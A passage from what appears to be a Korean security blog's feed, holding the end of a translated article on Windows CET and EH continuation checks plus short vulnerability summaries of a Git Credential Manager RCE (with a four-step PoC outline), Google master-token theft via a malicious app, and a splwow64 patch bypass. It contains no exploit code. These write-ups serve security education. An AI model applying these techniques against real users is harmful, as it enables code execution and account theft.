&#xBC18;&#xBCF5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xBA70;, &#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <code>RtlAddDynamicEHContinuationTarget</code>&#xC740; &#xB300;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; <code>ETL_RB_TREE_BPROCESS.NODE</code>&#xC5D0; <code>RTL_RB_NODE</code> &#xB9C1;&#xD06C;&#xB97C; &#xC5F0;&#xACB0;&#xD558;&#xB294; <code>DYNAMIC_EH_CONTINUATION_TARGET_ADD</code> &#xD50C;&#xB798;&#xADF8; &#xC138;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xBA70; &#xBC18;&#xB300;&#xB85C; &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xB300;&#xC0C1;&#xC744; &#xC870;&#xD68C;&#xD558;&#xACE0; &#xC2E4;&#xC81C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xC81C;&#xAC70;&#xB418;&#xACE0; &#xB178;&#xB4DC;&#xAC00; &#xD574;&#xC81C;&#xB41C;&#xB2E4;. &#xAC01; &#xD56D;&#xBAA9;&#xC774; &#xCC98;&#xB9AC;&#xB420; &#xB54C; <code>DYNAMIC_EH_CONTINUATION_TARGET_PROCESSED</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC6D0;&#xB798; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xC5D0; OR &#xCC98;&#xB9AC;&#xB418;&#xBBC0;&#xB85C; &#xD638;&#xCD9C;&#xC790;&#xB294; &#xC5B4;&#xB5A4; &#xD56D;&#xBAA9;&#xC774; &#xC791;&#xB3D9;&#xD558;&#xACE0; &#xC791;&#xB3D9;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; ROP &#xAC00;&#xC82F;&#xC774; &#xB2E8;&#xC21C;&#xD788; &#x2018;&#xB3D9;&#xC801; &#xC5F0;&#xC18D; &#xBAA9;&#xD45C;&#x2019;&#xB85C; &#xCD94;&#xAC00;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C;&#xC774; &#xAE30;&#xB2A5;&#xC758; &#xC874;&#xC7AC;&#xB294; CET/CFG&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xAE30;&#xB2A5;&#xC758; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xC6B0;&#xD68C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Microsoft&#xB294; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC640; Flash&#xC5D0; &#xB300;&#xD55C; <code>out-of-process JIT</code> &#xCEF4;&#xD30C;&#xC77C;&#xB9CC; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xC6D0;&#xD558;&#xBBC0;&#xB85C; &#xC774; API&#xB294; &#xC6D0;&#xACA9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xB9CC; &#xC791;&#xB3D9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC5D0; &#xC720;&#xC758;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xD56D;&#xC0C1; <code>STATUS_ACCESS_DENIED</code>&#xB85C; &#xC2E4;&#xD328;&#xD55C;&#xB2E4;.</p><h2 id="&#xD0C0;&#xAC9F;-&#xAC80;&#xC99D;"><a href="#&#xD0C0;&#xAC9F;-&#xAC80;&#xC99D;" class="headerlink" title="&#xD0C0;&#xAC9F; &#xAC80;&#xC99D;"></a>&#xD0C0;&#xAC9F; &#xAC80;&#xC99D;</h2><p>&#xC774; &#xBAA8;&#xB4E0; &#xC9C0;&#xC2DD;&#xC744; &#xD1B5;&#xD569;&#xD558;&#xBA74; <code>RtlVerifyUserUnwindTarget</code> &#xD568;&#xC218;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC26C;&#xC6CC;&#xC9C4;&#xB2E4;.</p><ol><li>CONTEXT_EX &#xAD6C;&#xC870;&#xC5D0;&#xC11C; &#xB300;&#xC0C1; RIP&#xC640; &#xC5F0;&#xAD00;&#xB41C; &#xB85C;&#xB4DC;&#xB41C; PE &#xBAA8;&#xB4C8;&#xC744; &#xC870;&#xD68C;&#xD55C;&#xB2E4;. &#xBA3C;&#xC800; <code>RtlpLookupUserFunctionTableInverted</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC2E4;&#xD328;&#xD558;&#xBA74; &#xB300;&#xC2E0; <code>MmGetImageBase</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBAA8;&#xB4C8;&#xC774; 4GB &#xBBF8;&#xB9CC;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</li><li>&#xBAA8;&#xB4C8;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xBA74; <code>LdrImageDirectoryEntryToLoadConfig</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; Image Load Configuration Directory&#xB97C; &#xAC00;&#xC838;&#xC628;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; Long Jump &#xB610;&#xB294; &#xC5F0;&#xC18D; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xC744; &#xB9CC;&#xD07C; &#xCDA9;&#xBD84;&#xD788; &#xD070;&#xC9C0;&#xC640; <code>guardflags</code>&#xC5D0; <code>IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT</code> &#xB610;&#xB294; <code>IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT</code>&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC5C6;&#xAC70;&#xB098; &#xB108;&#xBB34; &#xC791;&#xC740; &#xACBD;&#xC6B0; &#xD639;&#xC740; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; &#xD638;&#xD658;&#xC131;&#xC744; &#xC704;&#xD574; <code>STATUS_SUCCESS</code>&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</li><li>Image Load Configuration Directory&#xC5D0;&#xC11C; <code>GuardLongJumpTargetTable</code> &#xB610;&#xB294; <code>GuardEHContinuationTable</code>&#xC744; &#xAC00;&#xC838;&#xC624;&#xACE0; <code>GuardLongJumpTargetCount</code> &#xB610;&#xB294; <code>GuardEHContinuationCount</code>&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD55C;&#xB2E4;. &#xD56D;&#xBAA9;&#xC774; 40&#xC5B5; &#xAC1C; &#xC774;&#xC0C1;&#xC774;&#xBA74; <code>STATUS_INTEGER_OVERFLOW</code>&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;. 0 &#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xD56D;&#xBAA9;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xD1B5;&#xD574; bsearch_s (&#xB300;&#xC870;&#xC790;&#xB85C; <code>RtlpTarget Compare</code> &#xB97C; &#xC804;&#xB2EC;)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; binary search&#xB97C; &#xD1B5;&#xD574; RVA&#xB85C; &#xBCC0;&#xD658;&#xD55C; &#xD6C4; &#xB300;&#xC0C1; RIP&#xB97C; &#xCC3E;&#xB294;&#xB2E4;. &#xBC1C;&#xACAC;&#xB418;&#xBA74; <code>STATUS_SUCCESS</code>&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB300;&#xC0C1; RIP&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xAC70;&#xB098; (&#xB610;&#xB294; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC2DC;&#xC791;&#xD560; &#xD56D;&#xBAA9;&#xC774; 0&#xC778; &#xACBD;&#xC6B0;) &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB300;&#xC0C1; RIP&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; <code>STATUS_SET_CONTEXT_DENIED</code>&#xB97C; &#xBC18;&#xD658;&#xD574;  <code>longjmp</code> &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC99D;&#xD55C;&#xB2E4;.(<code>KCONTINUE_LONGJUMP</code>)</li><li>&#xC608;&#xC678; &#xD574;&#xC81C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; (<code>KCONTINUE_UNWIND</code>)&#xC758; &#xACBD;&#xC6B0; <code>RtlpFindDynamicEHContinuationTarget</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB4F1;&#xB85D;&#xB41C; &#xC5F0;&#xC18D; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xB9DE;&#xC73C;&#xBA74; <code>STATUS_SUCCESS</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xACE0;, &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <code>STATUS_SET_CONTEXT_DENIED</code>&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</li></ol><h1 id="&#xACB0;&#xB860;"><a href="#&#xACB0;&#xB860;" class="headerlink" title="&#xACB0;&#xB860;"></a>&#xACB0;&#xB860;</h1><p>CET&#xC758; &#xAD6C;&#xD604;&#xACFC; &#xAD00;&#xB828; mitigation&#xC740; ROP &#xBC0F; &#xAE30;&#xD0C0; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xD558;&#xC774;&#xC7AC;&#xD0B9; &#xAE30;&#xC220;&#xC758; &#xC0AC;&#xC6A9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC8FC;&#xC694; &#xB2E8;&#xACC4;&#xC774;&#xB2E4;. &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBB34;&#xACB0;&#xC131;&#xC740; &#xBD84;&#xBA85; &#xBCF5;&#xC7A1;&#xD55C; &#xC8FC;&#xC81C;&#xC774;&#xBA70;, &#xD5A5;&#xD6C4; &#xCD94;&#xAC00;&#xC801;&#xC778; mitigation&#xC774; &#xCD94;&#xAC00;&#xB428;&#xC5D0; &#xB530;&#xB77C; &#xB354;&#xC6B1; &#xBCF5;&#xC7A1;&#xD574;&#xC9C8; &#xAC83;&#xC774;&#xB2E4;. &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD638;&#xD658;&#xC131; &#xBB38;&#xC81C;&#xC640; &#xC77C;&#xD68C;&#xC131; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB85C; &#xC778;&#xD574; &#xD2B9;&#xC815; &#xCC98;&#xB9AC;&#xB97C; &#xD544;&#xC694;&#xB85C; &#xD558;&#xB294; &#xC0AC;&#xB840;&#xAC00; &#xC810;&#xC810; &#xB354; &#xB9CE;&#xC774; &#xBC1C;&#xACAC;&#xB420; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC644;&#xD654; &#xAE30;&#xC220;, &#xD2B9;&#xD788; &#xB9CE;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xB2A5;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xAE30;&#xC220;&#xC758; &#xBC1C;&#xC804;&#xB2E8;&#xACC4;&#xC5D0;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB9C8;&#xB828;&#xC774;&#xACE0;, &#xC6B0;&#xB9AC;&#xB294; &#xC774; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xB354; &#xB9CE;&#xC740; &#xC5F0;&#xAD6C;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D0;&#xC5D0; &#xB530;&#xB77C; &#xBBF8;&#xB798;&#xC5D0; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xAC83;&#xB4E4;&#xC774; &#xBC1C;&#xACAC;&#xB420; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xD655;&#xC2E0;&#xD55C;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>rop</tag>
      
      <tag>L0ch</tag>
      
      <tag>translation</tag>
      
      <tag>cet</tag>
      
      <tag>mitigation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-26233: Git CLI RCE</title>
    <link href="/2021/01/16/fabu1ous/2021-01-16/"/>
    <url>/2021/01/16/fabu1ous/2021-01-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/">https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git Credential Manager core &lt; 2.0.289</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC545;&#xC131; repository&#xB97C; fork &#xD55C; &#xD53C;&#xD574;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; CVE-2020-26233&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC720;&#xC0AC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; <a href="https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/">CVE-2020-27955</a>&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>git clone&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; top-level &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; clone &#xD55C; &#xD6C4; &#xC0C8;&#xB85C;&#xC6B4; git &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD574; &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; submodule&#xB4E4;&#xC744; clone &#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; repository&#xC758; root&#xB514;&#xB809;&#xD130;&#xB9AC; &#xC548;&#xC5D0; git.exe&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774; &#xC788;&#xB2E4;&#xBA74; Git Credential Manager core&#xAC00; configuration&#xC744; &#xC77D;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC774;&#xC720;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; git.exe&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB77C;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBC1B;&#xC73C;&#xBA74; Windows&#xB294; &#xC6B0;&#xC120;&#xC801;&#xC73C;&#xB85C; &#xD604;&#xC7AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; git.exe &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xC5C6;&#xC744; &#xB54C;&#xB9CC; %PATH% &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C; git.exe&#xB97C; &#xCC3E;&#xC544; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC0C8;&#xB85C;&#xC6B4; Repository&#xC0DD;&#xC131;, &#xD639;&#xC740; &#xAE30;&#xC874; Repository&#xC5D0; &#xD30C;&#xC77C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C; &#xD68D;&#xB4DD;</li><li>windows &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC758; &#xD30C;&#xC77C;&#xBA85;&#xC744; git.exe&#xB85C; &#xC218;&#xC815;&#xD574; &#xC5C5;&#xB85C;&#xB4DC;</li><li>&#xC784;&#xC758;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; Repository&#xB97C; fork &#xD558;&#xAE30;&#xB97C; &#xAE30;&#xB2E4;&#xB9BC;</li><li>RCE &#xC131;&#xACF5;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Google master token 탈취를 통한 구글 계정 접근</title>
    <link href="/2021/01/15/l0ch/2021-01-15/"/>
    <url>/2021/01/15/l0ch/2021-01-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.usejournal.com/how-i-stole-the-data-in-millions-of-peoples-google-accounts-aa1b72dcc075">How I stole the data in millions of people&#x2019;s Google accounts</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android/iOS<br>Google accounts</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD53C;&#xC2F1; &#xC571;&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xAC00; Google&#xC758; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC571;&#xC5D0;&#xC11C; <code>Google &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xAC00;&#xC785;</code> &#xBC84;&#xD2BC;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC791;&#xD55C; &#xB85C;&#xADF8;&#xC778; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Google&#xC740; &#xC774;&#xC804;&#xC5D0; &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC9C0;&#xC5ED;&#xACFC; &#xAC70;&#xB9AC;&#xAC00; &#xBA3C; &#xC9C0;&#xC5ED;&#xC5D0;&#xC11C; &#xB85C;&#xADF8;&#xC778; &#xC2DC;&#xB3C4;&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0; &#xC774;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xC704;&#xCE58; &#xAE30;&#xBC18; &#xB85C;&#xADF8;&#xC778; &#xCC28;&#xB2E8; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC5B4; &#xD574;&#xCEE4;&#xAC00; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC54C;&#xC544;&#xB3C4; &#xD53C;&#xD574;&#xC790;&#xC758; &#xACC4;&#xC815;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xAE30;&#xAE30;&#xC758; &#xAD6C;&#xAE00; &#xACC4;&#xC815; &#xAD00;&#xB9AC; &#xD1A0;&#xD070;&#xC778; Google master token&#xC744; &#xD0C8;&#xCDE8;&#xD558;&#xBA74; &#xC774;&#xB7EC;&#xD55C; &#xACC4;&#xC815; &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. master token&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC554;&#xD638;&#xB098; 2&#xB2E8;&#xACC4; &#xB85C;&#xADF8;&#xC778; &#xC124;&#xC815;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC774;&#xC0C1; &#xB9CC;&#xB8CC;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xC704;&#xCE58; &#xAC80;&#xC0AC;&#xC758; &#xB300;&#xC0C1;&#xC774; &#xC544;&#xB2C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704;&#xCE58; &#xAE30;&#xBC18; &#xB85C;&#xADF8;&#xC778; &#xCC28;&#xB2E8;&#xC774; &#xC791;&#xB3D9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD53C;&#xD574;&#xC790;&#xAC00; &#xD574;&#xCEE4;&#xC758; &#xC545;&#xC131; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xAD6C;&#xAE00; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xAC00;&#xC785;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xBA74; &#xAD6C;&#xAE00; &#xB85C;&#xADF8;&#xC778; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xD53C;&#xD574;&#xC790; &#xACC4;&#xC815;&#xC758; master token&#xC744; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xACE0; &#xD574;&#xCEE4;&#xB294; &#xC774; master token&#xC73C;&#xB85C; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAD6C;&#xAE00; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>google</tag>
      
      <tag>L0ch</tag>
      
      <tag>google credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1648: CVE-2020-0986 패치 우회 및 arbitrary address read</title>
    <link href="/2021/01/14/idioth/2021-01-14/"/>
    <url>/2021/01/14/idioth/2021-01-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://whereisk0shl.top/post/the_story_of_cve_2021_1648">THE STORY OF CVE-2021-1648</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows splwow64</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2021&#xB144; 1&#xC6D4; patch tuesday&#xC5D0;&#xC11C; <a href="https://hackyboiz.github.io/2020/12/31/idioth/2020-12-31/">CVE-2020-0986</a> &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; splwow64 &#xC11C;&#xBE44;&#xC2A4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD328;&#xCE58;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  CVE-2020-0986&#xC774; &#xD328;&#xCE58;&#xB41C; &#xD6C4; splwow64&#xC640; gdi32full&#xC5D0;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD504;&#xB9B0;&#xD130; &#xD578;&#xB4E4; &#xAC80;&#xC0AC; &#xD568;&#xC218; <code>FindDriverForCookie</code>&#xC640; <code>FindPrinterHandle</code> &#xCD94;&#xAC00;</li><li>&#xD3EC;&#xC778;&#xD130; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD55C; &#xD568;&#xC218; <code>UMPDStringPointerFromOffset</code>&#xACFC; <code>UMPDPointerFromOffset</code> &#xCD94;&#xAC00;</li></ol><p>1&#xBC88;&#xC758; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; &#xC5B4;&#xB5A4; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD578;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; <code>0x6A</code> &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xD568;&#xC218; <code>bAddPrinterHandle</code>&#xAC00; &#xC804;&#xC5ED; &#xBCC0;&#xC218; <code>qword_1800EABA0</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD799;&#xC5D0; &#xD504;&#xB9B0;&#xD2B8; &#xD578;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; &#xD504;&#xB9B0;&#xD130; &#xD578;&#xB4E4; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD574; <code>0x6D</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>FindDriverForCookie</code>&#xC640; <code>FindPrinterHandle</code>&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>0x6D</code>&#xC5D0;&#xC11C; <code>memcpy</code>&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; source address&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBCF5;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xC5EC; arbitrary address read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>2&#xBC88; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xC798;&#xBABB;&#xB41C; &#xBC94;&#xC704; &#xAC80;&#xC0AC;&#xB85C; &#xC778;&#xD574; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. splwow64&#xB294; x86&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xD658;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD56D;&#xC0C1; 32&#xBE44;&#xD2B8; &#xD799;&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB450; &#xD568;&#xC218;&#xB4E4;&#xC740; offset&#xACFC; portview+offset&#xC774; 